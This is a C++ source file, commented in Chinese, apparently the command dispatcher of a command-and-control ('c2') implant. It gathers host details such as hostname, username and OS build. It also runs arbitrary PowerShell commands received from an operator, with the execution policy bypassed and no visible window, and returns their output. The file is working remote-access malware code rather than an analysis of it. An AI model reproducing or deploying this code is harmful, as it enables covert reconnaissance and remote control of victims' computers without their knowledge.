// cmd_dispatch.cpp — 命令分发中心实现：SYS_INFO（系统信息）与 EXEC_PS（PowerShell 执行）
#include "pch.h"
#include "cmd_dispatch.h"

#include "protocol.h"

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0601
#include <windows.h>

#include <cstdio>
#include <cstring>
#include <string>
#include <thread>

namespace c2
{

    namespace
    {

        // RtlGetVersion 动态声明（避免依赖新 SDK 头）
        typedef struct
        {
            ULONG dwOSVersionInfoSize;
            ULONG dwMajorVersion;
            ULONG dwMinorVersion;
            ULONG dwBuildNumber;
            ULONG dwPlatformId;
            WCHAR szCSDVersion[128];
        } OsVersionInfoW;

        typedef LONG(WINAPI *RtlGetVersionFn)(OsVersionInfoW *);

    } // namespace

    std::string collect_sysinfo()
    {
        std::string out;
        char buf[256];

        // OS 版本（RtlGetVersion，GetVersionEx 已废弃）
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (ntdll)
        {
            auto fn = (RtlGetVersionFn)GetProcAddress(ntdll, "RtlGetVersion");
            if (fn)
            {
                OsVersionInfoW vi{};
                vi.dwOSVersionInfoSize = sizeof(vi);
                if (fn(&vi) == 0)
                {
                    snprintf(buf, sizeof(buf), "OS: Windows %lu.%lu (build %lu)\r\n",
                             vi.dwMajorVersion, vi.dwMinorVersion, vi.dwBuildNumber);
                    out += buf;
                }
            }
        }

        // CPU
        SYSTEM_INFO si{};
        GetSystemInfo(&si);
        snprintf(buf, sizeof(buf), "CPU: %u logical processors\r\n", si.dwNumberOfProcessors);
        out += buf;

        // 内存
        MEMORYSTATUSEX ms{};
        ms.dwLength = sizeof(ms);
        if (GlobalMemoryStatusEx(&ms))
        {
            snprintf(buf, sizeof(buf), "MEM: total %.0f MB, free %.0f MB\r\n",
                     ms.ullTotalPhys / 1048576.0, ms.ullAvailPhys / 1048576.0);
            out += buf;
        }

        // 磁盘 C:
        ULARGE_INTEGER total{}, free_{};
        if (GetDiskFreeSpaceExW(L"C:\\", nullptr, &total, &free_))
        {
            snprintf(buf, sizeof(buf), "DISK C:: total %.0f GB, free %.0f GB\r\n",
                     total.QuadPart / 1073741824.0, free_.QuadPart / 1073741824.0);
            out += buf;
        }

        // 主机名 / 用户名
        char host[256] = {0};
        DWORD hn = sizeof(host);
        if (GetComputerNameA(host, &hn))
            out += "HOST: " + std::string(host) + "\r\n";
        char user[256] = {0};
        DWORD un = sizeof(user);
        if (GetUserNameA(user, &un))
            out += "USER: " + std::string(user) + "\r\n";

        return out;
    }

    std::string exec_powershell(const std::string& command, uint8_t& status) {
        status = kStatusOK;

        // ---------- 1. UTF-8 → UTF-16 命令行转换 ----------
        int wlen = MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, nullptr, 0);
        if (wlen <= 0) {
            status = kStatusBadParam;
            return "invalid command encoding";
        }
        std::wstring wcmd(wlen, 0);
        MultiByteToWideChar(CP_UTF8, 0, command.c_str(), -1, &wcmd[0], wlen);
        std::wstring cmdline =
            L"powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"$OutputEncoding = [System.Text.Encoding]::UTF8; [Console]::OutputEncoding = [System.Text.Encoding]::UTF8; " +
            wcmd + L"\"";

        // ---------- 2. 创建管道，写端可继承 ----------
        SECURITY_ATTRIBUTES sa{ sizeof(sa), nullptr, TRUE };
        HANDLE readPipe = nullptr, writePipe = nullptr;
        if (!CreatePipe(&readPipe, &writePipe, &sa, 0)) {
            status = kStatusBadParam;
            return "CreatePipe failed";
        }
        // 确保写句柄可以被子进程继承
        SetHandleInformation(writePipe, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

        // ---------- 3. 设置 STARTUPINFO ----------
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdOutput = writePipe;
        si.hStdError = writePipe;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

        PROCESS_INFORMATION pi{};

        // ---------- 4. 创建 Job Object（用于进程树管理）----------
        HANDLE hJob = nullptr;
        bool hasJob = false;
        hJob = CreateJobObjectW(nullptr, nullptr);
        if (hJob) {
            // 设置 Job 限制：关闭 Job 句柄时自动终止所有关联进程
            JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = {};
            jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
            if (SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                &jeli, sizeof(jeli))) {
                hasJob = true;
            }
            else {
                // 设置失败则关闭 Job，后续降级为原始行为
                CloseHandle(hJob);
                hJob = nullptr;
            }
        }

        // ---------- 5. 创建进程（挂起，以便分配 Job）----------
        BOOL ok = CreateProcessW(nullptr, &cmdline[0], nullptr, nullptr, TRUE,
            CREATE_NO_WINDOW | CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);
        CloseHandle(writePipe);
        if (!ok) {
            CloseHandle(readPipe);
            if (hJob) CloseHandle(hJob);
            status = kStatusUnknownCmd;
            return "CreateProcess failed";
        }

        if (hasJob) {
            if (!AssignProcessToJobObject(hJob, pi.hProcess)) {
                CloseHandle(hJob);
                hJob = nullptr;
                hasJob = false;
            }
        }
        ResumeThread(pi.hThread);

        std::string output;
        std::thread reader([&]() {
            char buf[4096];
            DWORD n = 0;
            while (ReadFile(readPipe, buf, sizeof(buf), &n, nullptr) && n > 0)
                output.append(buf, n);
            });

        // ---------- 7. 等待进程结束 ----------
        DWORD wait = WaitForSingleObject(pi.hProcess, 120000);
        if (wait == WAIT_TIMEOUT) {
            if (hasJob && hJob) TerminateJobObject(hJob, 1);
            else TerminateProcess(pi.hProcess, 1);
        }
        else {
            if (hasJob && hJob) TerminateJobObject(hJob, 1); // 强制清理残留子进程
        }

        // 确保所有进程被终止，管道写端关闭
        if (hasJob && hJob) {
            Sleep(100);
            CloseHandle(hJob);
            hJob = nullptr;
        }

        reader.join();

        CloseHandle(readPipe);
        CloseHandle(pi.hThread);
        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);

        char tail[64];
        snprintf(tail, sizeof(tail), "\r\n[exit code: %lu]", code);
        return output + tail;
    }

    bool handle_command(uint16_t cmd, const uint8_t *payload, size_t len,
                        std::vector<uint8_t> &response, uint8_t &status)
    {
        status = kStatusOK;
        std::string text;
        switch (cmd)
        {
        case kCmdSysInfo:
            text = collect_sysinfo();
            break;
        case kCmdExecPs:
            if (len == 0)
            {
                status = kStatusBadParam;
                return true;
            }
            text = exec_powershell(std::string((const char *)payload, len), status);
            break;
        default:
            status = kStatusUnknownCmd;
            return false; // 未处理：调用方不回 CMD_RESULT
        }
        response.assign(text.begin(), text.end());
        return true;
    }

} // namespace c2
